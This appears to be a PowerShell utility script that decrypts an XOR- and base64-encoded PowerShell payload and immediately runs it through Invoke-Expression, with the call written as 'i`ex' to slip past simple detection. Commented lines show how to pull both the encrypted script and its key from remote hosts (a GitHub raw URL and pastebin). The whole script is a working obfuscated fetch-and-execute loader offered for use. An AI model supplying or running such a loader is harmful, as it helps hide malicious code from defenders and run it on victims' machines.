<# ========================= Decrypt And Run Powershell Scripts ========================


SYNOPSIS
Usess powershell to decrypt and run a powershell script.

USAGE
1. Encrypt your pwershell code with - https://github.com/beigeworm/Powershell-Tools-and-Toys/blob/main/Misc/Text-Cipher-Tool.ps1
2. Add your encrypted script and password below 
3. The script will print the decoded script and immediately run it.

#>

# Add your encrypted powershell script here
$enc = 'YOUR_ENCRYPTED_SCRIPT_HERE'
# OR $enc = irm 'https://raw.githubusercontent.com/Username/Repo/main/Your_ENCODED_Script'


# Add your decryption key here 
$key = 'YOUR_SECRET_KEY'
# OR $key = irm 'https://pastebin.com/raw/sL1dwa7x4'

function Decipher-Text {
    param ([string]$encodedText,[string]$key)
    $decodedText = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedText))
    $result = ""
    for ($i = 0; $i -lt $decodedText.Length; $i++) {
        $charCode = [int]$decodedText[$i] -bxor [int]$key[$i % $key.Length]
        $result += [char]$charCode
    }
    return $result
}

$decrypted = Decipher-Text -encodedText $enc -key $key

Write-Host $decrypted -ForegroundColor Cyan

$decrypted | i`ex